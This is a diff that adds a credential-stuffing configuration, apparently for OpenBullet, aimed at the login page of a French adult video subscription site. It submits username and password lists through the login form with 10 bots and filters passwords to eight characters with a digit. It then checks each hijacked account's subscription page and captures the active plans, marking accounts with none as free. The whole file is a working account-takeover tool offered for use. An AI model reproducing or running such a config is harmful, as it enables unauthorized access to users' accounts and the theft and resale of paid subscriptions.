@@ -1,0 +1,78 @@
+[SETTINGS]
+{
+  "Name": "Jacquie et Michel TV",
+  "SuggestedBots": 10,
+  "LastModified": "2019-07-03T21:07:43.1248544+02:00",
+  "AdditionalInfo": "",
+  "Author": "Shaidow",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [
+    {
+      "SliceName": "PASS",
+      "RuleType": 2,
+      "RuleString": "8",
+      "Id": 1963357566
+    },
+    {
+      "SliceName": "PASS",
+      "RuleType": 0,
+      "RuleString": "Digit",
+      "Id": 1839278009
+    }
+  ],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://www.jacquieetmichel.net/se-connecter.html" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "cache-control: max-age=0" 
+  HEADER "dnt: 1" 
+  HEADER "upgrade-insecure-requests: 1" 
+#TOKEN PARSE "<COOKIES(csrftoken)>" LR "" "" -> VAR "TOKEN" 
+#LOGIN REQUEST POST "https://www.jacquieetmichel.net/se-connecter.html" 
+  CONTENT "------WebKitFormBoundarywBIWy1wYqnDbbZAS\nContent-Disposition: form-data; name=\"username\"\n\n<USER>\n------WebKitFormBoundarywBIWy1wYqnDbbZAS\nContent-Disposition: form-data; name=\"password\"\n\n<PASS>\n------WebKitFormBoundarywBIWy1wYqnDbbZAS--" 
+  CONTENTTYPE "multipart/form-data; boundary=----WebKitFormBoundarywBIWy1wYqnDbbZAS" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "accept-language: fr" 
+  HEADER "content-disposition: attachment; filename=\"undefined\"" 
+  HEADER "dnt: 1" 
+  HEADER "origin: https://www.jacquieetmichel.net" 
+  HEADER "referer: https://www.jacquieetmichel.net/se-connecter.html" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+  HEADER "x-csrftoken: <TOKEN>" 
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "success\": false" 
+  KEYCHAIN Success OR 
+    KEY "success\": true" 
+REQUEST GET "https://www.jacquieetmichel.net/zm/contributor/edit/subscriptions" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "dnt: 1" 
+  HEADER "upgrade-insecure-requests: 1" 
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "Vous n'avez aucun abonnement actif" 
+PARSE "<SOURCE>" LR "<td>" "<" Recursive=TRUE -> CAP "Abonnement" 
